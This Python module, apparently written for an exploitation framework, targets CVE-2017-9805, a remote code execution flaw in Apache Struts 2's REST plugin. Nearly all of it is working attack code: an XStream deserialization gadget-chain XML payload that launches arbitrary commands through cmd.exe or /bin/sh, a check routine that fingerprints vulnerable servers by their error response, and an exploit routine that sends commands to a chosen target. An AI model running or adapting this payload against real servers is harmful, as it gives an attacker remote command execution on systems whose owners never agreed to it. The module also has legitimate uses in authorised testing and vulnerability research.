import os,sys,time,cgi
from lib.common import http

class Module:
    def __init__(self,Main):
        self.main=Main
        self.info={
            'Name':'Apache Struts 2 REST Plugin XStream RCE',
            'Author':'sushan',
            'Description':'Apache Struts versions 2.1.2 - 2.3.33 and Struts 2.5 - Struts 2.5.12,using the REST plugin,are vulnerable to a Java deserialization attack in the XStream library',
            'Comments':'https://cvedetails.com/cve/CVE-2017-9805'
        }
        self.options={
            'RHOST':{
                'Description':'The target address',
                'Required':True,
                'Value':''
            },
            'RPORT':{
                'Description':'The target port (TCP)',
                'Required':True,
                'Value':'8080'
            },
            'URIPATH':{
                'Description':'Path to action',
                'Required':True,
                'Value':'/052/orders/3'
            },
            'URL':{
                'Description':'The URL to use for this exploit',
                'Required':False,
                'Value':'/'
            },
            'OS':{
                'Description':'Target Platform OS',
                'Required':True,
                'Value':'windows'
            }
        }

    def payload(self,cmd):
        x='''
<map><entry>
<jdk.nashorn.internal.objects.NativeString>
<value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
<dataHandler>
<dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
<is class="javax.crypto.CipherInputStream">
<cipher class="javax.crypto.NullCipher">
<serviceIterator class="javax.imageio.spi.FilterIterator">
<iter class="javax.imageio.spi.FilterIterator">
<iter class="java.util.Collections$EmptyIterator"/>
<next class="java.lang.ProcessBuilder">
<command>%s</command></next></iter>
<filter class="javax.imageio.ImageIO$ContainsFilter"><method>
<class>java.lang.ProcessBuilder</class>
<name>start</name><parameter-types/></method></filter>
<next class="string"></next>
</serviceIterator><lock/></cipher>
<input class="java.lang.ProcessBuilder$NullInputStream"/>
<ibuffer></ibuffer></is></dataSource>
<transferFlavors/></dataHandler></value>
</jdk.nashorn.internal.objects.NativeString>
<jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
</entry></map>'''
        win='<string>cmd.exe</string><string>/c</string><string>%s</string>'
        unx='<string>/bin/sh</string><string>-c</string><string>%s</string>'
        if self.options['OS']['Value'].lower().find('win')!=-1:
            cmd=win % (cmd)
        else:
            cmd=unx % (cmd)
        xx=x % (cmd)
        return xx

    def check(self):
        req=http.Http(self.options)
        xx=req.post({'Content-Type':'application/xml'},self.payload(''))
        if xx!=None and xx.status_code==500 and xx.text.find('java.lang.String cannot be cast to java.security.Provider$Service')!=-1:
            return True
        return False

    def exploit(self,cmd):
        req=http.Http(self.options)
        cmd=cgi.escape(cmd)
        req.post({'Content-Type':'application/xml'},self.payload(cmd))
        return '[*] execute cmd finish.'
